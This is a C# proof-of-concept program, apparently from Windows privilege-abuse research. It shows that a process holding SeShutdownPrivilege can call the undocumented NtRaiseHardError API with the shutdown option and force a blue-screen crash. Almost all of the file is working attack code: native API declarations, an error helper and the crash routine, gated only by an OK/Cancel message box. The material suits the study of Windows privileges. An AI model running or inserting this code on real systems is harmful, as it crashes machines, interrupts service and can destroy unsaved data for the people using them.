using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace SeShutdownPrivilegePoC
{
    class SeShutdownPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        enum HARDERROR_RESPONSE
        {
            ResponseReturnToCaller,
            ResponseNotHandled,
            ResponseAbort,
            ResponseCancel,
            ResponseIgnore,
            ResponseNo,
            ResponseOk,
            ResponseRetry,
            ResponseYes
        }

        enum HARDERROR_RESPONSE_OPTION
        {
            OptionAbortRetryIgnore,
            OptionOk,
            OptionOkCancel,
            OptionRetryCancel,
            OptionYesNo,
            OptionYesNoCancel,
            OptionShutdownSystem
        }

        enum MESSAGEBOX_RETURN
        {
            IDOK = 1,
            IDCANCEL = 2,
            IDABORT = 3,
            IDRETRY = 4,
            IDIGNORE = 5,
            IDYES = 6,
            IDNO = 7,
            IDTRYAGAIN = 10,
            IDCONTINUE = 11
        }

        [Flags]
        enum MESSAGEBOX_TYPE : uint
        {
            MB_APPLMODAL = 0x00000000u,
            MB_DEFBUTTON1 = 0x00000000u,
            MB_OK = 0x00000000u,
            MB_OKCANCEL = 0x00000001u,
            MB_ABORTRETRYIGNORE = 0x00000002u,
            MB_YESNOCANCEL = 0x00000003u,
            MB_YESNO = 0x00000004u,
            MB_RETRYCANCEL = 0x00000005u,
            MB_CANCELTRYCONTINUE = 0x00000006u,
            MB_ICONSTOP = 0x00000010u,
            MB_ICONERROR = 0x00000010u,
            MB_ICONHAND = 0x00000010u,
            MB_ICONQUESTION = 0x00000020u,
            MB_ICONEXCLAMATION = 0x00000030u,
            MB_ICONWARNING = 0x00000030u,
            MB_ICONINFORMATION = 0x00000040u,
            MB_ICONASTERISK = 0x00000040u,
            MB_DEFBUTTON2 = 0x00000100u,
            MB_DEFBUTTON3 = 0x00000200u,
            MB_DEFBUTTON4 = 0x00000300u,
            MB_SYSTEMMODAL = 0x00001000u,
            MB_TASKMODAL = 0x00002000u,
            MB_HELP = 0x00004000u,
            MB_SETFOREGROUND = 0x00010000u,
            MB_DEFAULT_DESKTOP_ONLY = 0x00020000u,
            MB_TOPMOST = 0x00040000u,
            MB_RIGHT = 0x00080000u,
            MB_RTLREADING = 0x00100000u,
            MB_SERVICE_NOTIFICATION = 0x00200000u
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int MessageBox(
            IntPtr hWnd,
            string lpText,
            string lpCaption,
            MESSAGEBOX_TYPE uType);

        [DllImport("ntdll.dll")]
        static extern int NtRaiseHardError(
            int ErrorStatus,
            uint NumberOfParameters,
            IntPtr /* PUNICODE_STRING */ UnicodeStringParameterMask,
            IntPtr Parameters,
            HARDERROR_RESPONSE_OPTION ResponseOption,
            out HARDERROR_RESPONSE Response );

        /*
         * User defined functions
         */
        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static bool RaiseBSOD()
        {
            int STATUS_SUCCESS = 0;
            int STATUS_ACCESS_VIOLATION = Convert.ToInt32("0xC0000005", 16);

            int ntstatus = NtRaiseHardError(
                STATUS_ACCESS_VIOLATION,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                HARDERROR_RESPONSE_OPTION.OptionShutdownSystem,
                out HARDERROR_RESPONSE Response);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to raise hard error.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));

                return false;
            }

            Console.WriteLine("[+] NtRaiseHardError API is called successfully.");

            return true;
        }

        static void Main()
        {
            Console.WriteLine("[*] If you have SeShutdownPrivilege, you can raise hard error.");
            Console.WriteLine("[*] This PoC tries to cause BSOD with hard error.");

            int ret = MessageBox(
                IntPtr.Zero,
                "This PoC will cause BSOD.\nAre you ready?",
                "Alert",
                MESSAGEBOX_TYPE.MB_OKCANCEL | MESSAGEBOX_TYPE.MB_ICONEXCLAMATION);
            
            if ((MESSAGEBOX_RETURN)ret != MESSAGEBOX_RETURN.IDOK)
            {
                Console.WriteLine("[*] Abort.");
                return;
            }

            Console.WriteLine("[>] Trying to raise hard error.");

            RaiseBSOD();
        }
    }
}
